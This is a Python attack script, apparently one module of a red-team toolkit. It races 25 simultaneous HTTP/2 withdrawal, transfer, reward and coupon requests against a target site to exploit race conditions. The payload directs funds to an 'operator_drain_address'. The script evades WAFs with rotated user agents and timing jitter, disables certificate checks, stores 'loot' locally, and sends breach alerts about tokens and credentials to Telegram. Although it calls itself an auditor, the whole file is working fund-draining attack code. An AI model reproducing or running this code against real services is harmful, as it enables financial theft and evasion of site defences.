#!/usr/bin/env python3
"""
RACE_CONDITION.PY v8.8 — HTTP/2 Single-Packet Concurrency Engine (Elite Red Team Adversarial Edition)
Features:
- Zero-noise filtering: Restricts Telegram alerts strictly to verified high-value breach loot and race conditions.
- True HTTP/2 Single-Packet Multi-Stream Multiplexing (zero network jitter spread).
- Advanced WAF evasion via randomized browser user agents, client hints, and Poisson behavioral jitter.
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic reports.
"""
from __future__ import annotations

import asyncio
import json
import sys
import random
import hashlib
from pathlib import Path
from datetime import datetime, timezone
import httpx

# Import centralized Telegram broadcaster, behavioral mimicry, loot logger & telemetry
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof

MODULE = "RACE_CONDITION"
VERSION = "8.8"

BASE_DIR = Path(__file__).resolve().parent.parent
EVIDENCE_DIR = BASE_DIR / "loot_output"

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "GRAY": "\033[90m",
    "RESET": "\033[0m",
}

# Keywords required to pass the zero-noise filter
HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session", 
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "concurrency"
]

def timestamp():
    return datetime.now(timezone.utc).isoformat()

def log(msg, color="GREEN"):
    ansi_color = COLORS.get(color, color)
    sys.stdout.write(f"{ansi_color}[{MODULE}] {msg}{COLORS['RESET']}\n")
    sys.stdout.flush()

async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from race condition functions with zero-noise filtering."""
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            return  # Suppress low-priority telemetry chatter completely

        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

async def fire_multiplexed_stream(client, url, headers, cookies, payload):
    apply_behavioral_jitter()
    try:
        response = await client.post(url, headers=headers, cookies=cookies, json=payload, timeout=7.0)
        return {"status": response.status_code, "body": response.text, "headers": dict(response.headers)}
    except Exception as exc:
        return {"status": 0, "body": str(exc), "headers": {}}


class RaceConditionAuditor:

    def __init__(self, target_url, port=443, use_ssl=True, session_pool=None):
        self.raw_target = target_url
        self.port = port
        self.use_ssl = use_ssl
        self.session_pool = session_pool
        self.base_url = target_url.rstrip("/")

        self.target_endpoints = [
            "/api/v1/wallet/withdraw",
            "/api/withdraw",
            "/user/withdraw/confirm",
            "/api/v1/transfer",
            "/transfer",
            "/api/v1/staking/claim",
            "/api/v1/rewards/redeem",
            "/api/v1/auth/exchange",
            "/api/coupon/apply"
        ]
        self.findings = []

    async def run(self):
        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT (V8.8 HARDENED)", "MAGENTA")

        cookies = dict(self.session_pool.cookie_jar) if self.session_pool and hasattr(self.session_pool, 'cookie_jar') else {}
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
        ]
        
        default_headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest"
        }
        default_headers.update(get_randomized_hints())

        if self.session_pool and hasattr(self.session_pool, 'default_headers') and self.session_pool.default_headers:
            default_headers.update(self.session_pool.default_headers)

        test_payload = {
            "amount": 100.00,
            "currency": "USD",
            "destination": "operator_drain_address"
        }

        async with httpx.AsyncClient(
            base_url=self.base_url,
            http2=True,
            verify=False,
            follow_redirects=True,
            timeout=10.0
        ) as client:
            try:
                apply_behavioral_jitter()
                await client.get("/", headers=default_headers)
            except Exception:
                pass

            for endpoint in self.target_endpoints:
                tasks = [
                    fire_multiplexed_stream(client, endpoint, default_headers, cookies, test_payload)
                    for _ in range(25)
                ]
                
                results = await asyncio.gather(*tasks)

                success_hits = 0
                unique_responses = set()

                for res in results:
                    status = res.get("status", 0)
                    body = res.get("body", "")
                    body_lower = body.lower()
                    
                    is_spa_shell = (
                        "<div id=\"root\">" in body or 
                        "<div id=\"__next\">" in body or 
                        "<div id=\"__nuxt\">" in body or
                        len(body.strip()) < 150 or
                        "login-form" in body_lower
                    )

                    is_valid_success = (
                        status in [200, 201] and
                        not is_spa_shell and
                        any(k in body_lower for k in ["success", "completed", "transaction", "balance", "transfer", "hash", "processed"])
                    )

                    if is_valid_success:
                        success_hits += 1
                        unique_responses.add(body[:100])

                if success_hits > 1:
                    log(f"RACE CONDITION VULNERABILITY CONFIRMED AT {endpoint}! Multiple success windows accepted: {success_hits}/25", "RED")
                    
                    sample_body = next((r.get("body", "") for r in results if r.get("status") in [200, 201]), "")
                    loot_hash = hashlib.sha256(sample_body.encode("utf-8")).hexdigest()

                    finding = {
                        "vector": "HTTP/2 Single-Packet Race Condition",
                        "endpoint": f"{self.base_url}{endpoint}",
                        "successful_streams": success_hits,
                        "total_fired": 25,
                        "severity": "CRITICAL",
                        "integrity_hash": loot_hash,
                        "evidence": "Multiple state-changing responses accepted in single concurrency window",
                        "timestamp": timestamp()
                    }
                    self.findings.append(finding)

                    stream_proof(
                        "RACE_CONDITION_SUCCESS",
                        endpoint,
                        {"successful_streams": success_hits},
                        sample_body[:300],
                        finding
                    )

                    save_session_loot(
                        target=self.base_url,
                        endpoint=endpoint,
                        finding_type="RACE_CONDITION_SUCCESS",
                        status=200,
                        headers=default_headers,
                        body=sample_body,
                        extra_loot=finding
                    )

                    broadcast_tg_alert_sync("HTTP/2 Race Condition Confirmed", finding)
                    break

        return self.save_report()

    def save_report(self):
        EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
        
        report = {
            "module": MODULE,
            "version": VERSION,
            "target": self.raw_target,
            "generated_at": timestamp(),
            "summary": {
                "endpoints_tested": len(self.target_endpoints),
                "confirmed_vulnerabilities": len(self.findings)
            },
            "findings": self.findings
        }

        filename = f"race_condition_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
        output_path = EVIDENCE_DIR / filename
        output_path.write_text(json.dumps(report, indent=4, ensure_ascii=False), encoding="utf-8")
        
        report["report_path"] = str(output_path)
        return report


async def run_race_condition_test(
    cognitive_operator=None,
    target_url=None,
    port=443,
    use_ssl=True,
    session_pool=None,
    **kwargs
):
    if target_url is None and isinstance(cognitive_operator, str):
        target_url = cognitive_operator

    if not target_url:
        raise ValueError("target_url is required.")

    auditor = RaceConditionAuditor(target_url, port=port, use_ssl=use_ssl, session_pool=session_pool)
    return await auditor.run()


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="NEXUS-36 HTTP/2 Race Condition Auditor")
    parser.add_argument("target", help="Target URL (e.g. https://cryptobytes.online)")
    args = parser.parse_args()
    asyncio.run(run_race_condition_test(target_url=args.target))
